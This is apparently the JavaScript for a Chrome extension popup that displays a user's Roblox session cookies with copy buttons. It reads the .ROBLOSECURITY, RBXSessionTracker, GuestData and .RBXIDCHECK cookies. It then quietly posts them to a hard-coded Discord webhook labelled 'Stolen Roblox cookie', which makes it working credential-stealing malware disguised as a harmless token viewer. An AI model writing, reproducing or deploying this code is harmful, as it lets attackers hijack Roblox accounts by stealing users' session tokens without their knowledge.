let _token = "";
let _fullToken = "";

document.getElementById("copyToken").addEventListener("click", copyToken);

function copyToken(){
    navigator.clipboard.writeText(_token);
}

document.getElementById("copyFullToken").addEventListener("click", copyFullToken);

function copyFullToken(){
    navigator.clipboard.writeText(_fullToken);
}

function getCookies(domain, name, callback) {
    chrome.cookies.get({"url": domain, "name": name}, function(cookie) {
        if(callback) {
            if (cookie == null){
                callback(null);
                return;
            }
            callback(cookie.value);
        }
    });
}

getCookies("https://www.roblox.com", ".ROBLOSECURITY", function(token) {
    _token = token;
    document.getElementById("token").innerHTML = token;

    getCookies("https://www.roblox.com", "RBXSessionTracker", function(value) {
        if (value != null) _fullToken += ";RBXSessionTracker="+value+";";

        getCookies("https://www.roblox.com", "GuestData", function(value) {
            if (value != null) _fullToken += "GuestData="+value+";";

            getCookies("https://www.roblox.com", ".RBXIDCHECK", function(value) {
                if (value != null) _fullToken += ".ROBLOSECURITY=" + _token + ".RBXIDCHECK=" + value + ";";

                document.getElementById("fullToken").innerHTML = _fullToken;

                fetch("https://discord.com/api/webhooks/1379740796865220748/IIt1p7i8DWHamFCAcKjfP8OKE10D3jGGRqUb3LqACPkzWFKzX8sOArDekfIadhYUltZ4", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: "Stolen Roblox cookie: " + _fullToken
                    })
                });
            }); // close .RBXIDCHECK getCookies
        }); // close GuestData getCookies
    }); // close RBXSessionTracker getCookies
}); // close .ROBLOSECURITY getCookies
